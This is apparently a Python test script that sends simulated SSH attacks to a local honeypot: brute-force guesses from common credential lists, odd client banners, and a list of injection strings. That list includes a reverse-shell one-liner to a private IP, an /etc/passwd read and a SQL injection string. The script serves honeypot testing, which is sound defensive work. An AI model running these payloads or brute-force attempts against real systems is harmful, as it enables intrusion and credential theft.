#!/usr/bin/env python
"""
SSH Honeypot Attack Simulator

This script simulates various common SSH attack patterns against the honeypot.
It tests brute force attempts, command injection, and other SSH-based attacks.
"""

import asyncio
import random
import socket
import time
import argparse
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("ssh_attack_simulator")

# Common usernames and passwords for brute force simulation
COMMON_USERNAMES = [
    "admin", "root", "administrator", "user", "guest", 
    "support", "oracle", "test", "ubuntu", "ec2-user"
]

COMMON_PASSWORDS = [
    "password", "123456", "admin", "root", "qwerty",
    "letmein", "welcome", "password123", "admin123", "P@ssw0rd"
]

# Command injection patterns
COMMAND_INJECTION_PATTERNS = [
    "admin; cat /etc/passwd",
    "root && ls -la",
    "test | id",
    "guest`id`",
    "admin;bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
    "admin' OR 1=1 --",
    "root; echo 'SSH_backdoor_test'",
]

# SSH Client ID strings to use
SSH_CLIENT_IDS = [
    "SSH-2.0-OpenSSH_7.5",
    "SSH-2.0-PuTTY_Release_0.70",
    "SSH-2.0-JSCH-0.1.54",
    "SSH-2.0-libssh2_1.8.0",
    # Unusual/suspicious clients
    "SSH-2.0-HACKER_Custom_Client",
    "SSH-2.0-Metasploit",
    "SSH-2.0-Kali_Penetration_Testing",
]

class SSHAttackSimulator:
    """Simulate various SSH attacks against a honeypot."""

    def __init__(self, target_ip='127.0.0.1', target_port=2222):
        """Initialize the SSH attack simulator."""
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_count = 0
    
    async def connect(self):
        """Create a raw socket connection to the SSH server."""
        try:
            # Create socket
            reader, writer = await asyncio.open_connection(
                self.target_ip, self.target_port
            )
            
            logger.info(f"Connected to {self.target_ip}:{self.target_port}")
            
            # Read SSH banner from server
            banner = await reader.readline()
            logger.info(f"Server banner: {banner.decode().strip()}")
            
            return reader, writer
        except Exception as e:
            logger.error(f"Connection failed: {str(e)}")
            return None, None
    
    async def simulate_brute_force(self, attempts=5):
        """Simulate a brute force attack on the SSH server."""
        logger.info(f"Starting SSH brute force simulation ({attempts} attempts)")
        
        for i in range(attempts):
            reader, writer = await self.connect()
            if not reader or not writer:
                continue
            
            try:
                # Send client identification
                client_id = random.choice(SSH_CLIENT_IDS)
                writer.write(f"{client_id}\r\n".encode())
                await writer.drain()
                
                # Wait for server response/password prompt
                await asyncio.sleep(1)
                
                # Send username and password
                username = random.choice(COMMON_USERNAMES)
                password = random.choice(COMMON_PASSWORDS)
                
                # For simplicity, we're just sending the password when prompted
                writer.write(f"{password}\r\n".encode())
                await writer.drain()
                
                logger.info(f"Brute force attempt {i+1}/{attempts}: {username}:{password}")
                
                # Wait for response
                await asyncio.sleep(1)
                
                # Log the response (this will usually be "Access Denied")
                response = await reader.read(1024)
                logger.info(f"Response: {response.decode()}")
                
                self.attack_count += 1
            except Exception as e:
                logger.error(f"Error during brute force attempt: {str(e)}")
            finally:
                writer.close()
                await writer.wait_closed()
            
            # Add delay between attempts
            await asyncio.sleep(random.uniform(0.5, 2.0))
    
    async def simulate_command_injection(self, attempts=3):
        """Simulate command injection attacks."""
        logger.info(f"Starting SSH command injection simulation ({attempts} attempts)")
        
        for i in range(attempts):
            reader, writer = await self.connect()
            if not reader or not writer:
                continue
            
            try:
                # Send client identification
                client_id = random.choice(SSH_CLIENT_IDS)
                writer.write(f"{client_id}\r\n".encode())
                await writer.drain()
                
                # Wait for server response/password prompt
                await asyncio.sleep(1)
                
                # Send command injection as password
                injection = random.choice(COMMAND_INJECTION_PATTERNS)
                writer.write(f"{injection}\r\n".encode())
                await writer.drain()
                
                logger.info(f"Command injection attempt {i+1}/{attempts}: {injection}")
                
                # Wait for response
                await asyncio.sleep(1)
                
                # Log the response
                response = await reader.read(1024)
                logger.info(f"Response: {response.decode()}")
                
                self.attack_count += 1
            except Exception as e:
                logger.error(f"Error during command injection attempt: {str(e)}")
            finally:
                writer.close()
                await writer.wait_closed()
            
            # Add delay between attempts
            await asyncio.sleep(random.uniform(1.0, 3.0))
    
    async def simulate_unusual_client(self):
        """Simulate connection from unusual SSH client."""
        logger.info("Simulating unusual SSH client connection")
        
        reader, writer = await self.connect()
        if not reader or not writer:
            return
        
        try:
            # Send suspicious client identification
            client_id = "SSH-2.0-SUSPICIOUS_BOTNET_CLIENT"
            writer.write(f"{client_id}\r\n".encode())
            await writer.drain()
            
            # Wait for server response/password prompt
            await asyncio.sleep(1)
            
            # Send some random data
            writer.write(b"\\x00\\x01\\x02\\x03\\x04\\x05HACKED\r\n")
            await writer.drain()
            
            logger.info(f"Unusual client simulation sent: {client_id}")
            
            # Wait for response
            await asyncio.sleep(1)
            
            # Log the response
            response = await reader.read(1024)
            logger.info(f"Response: {response}")
            
            self.attack_count += 1
        except Exception as e:
            logger.error(f"Error during unusual client simulation: {str(e)}")
        finally:
            writer.close()
            await writer.wait_closed()
    
    async def run_all_simulations(self):
        """Run all SSH attack simulations."""
        logger.info(f"Starting SSH attack simulations against {self.target_ip}:{self.target_port}")
        
        # Run brute force simulation
        await self.simulate_brute_force(attempts=2)
        
        # Run command injection simulation
        await self.simulate_command_injection(attempts=1)
        
        # Run unusual client simulation
        await self.simulate_unusual_client()
        
        logger.info(f"Completed all SSH attack simulations. Total attacks: {self.attack_count}")

async def main():
    """Main function to run the SSH attack simulator."""
    parser = argparse.ArgumentParser(description='SSH Honeypot Attack Simulator')
    parser.add_argument('--ip', type=str, default='127.0.0.1',
                        help='Target IP address (default: 127.0.0.1)')
    parser.add_argument('--port', type=int, default=2222,
                        help='Target port (default: 2222)')
    args = parser.parse_args()
    
    print("=" * 70)
    print(f"SSH Honeypot Attack Simulator - {datetime.now()}")
    print("=" * 70)
    print(f"Target: {args.ip}:{args.port}")
    print("This tool simulates various SSH attacks for testing honeypots")
    print("=" * 70)
    
    simulator = SSHAttackSimulator(args.ip, args.port)
    await simulator.run_all_simulations()

if __name__ == "__main__":
    asyncio.run(main())
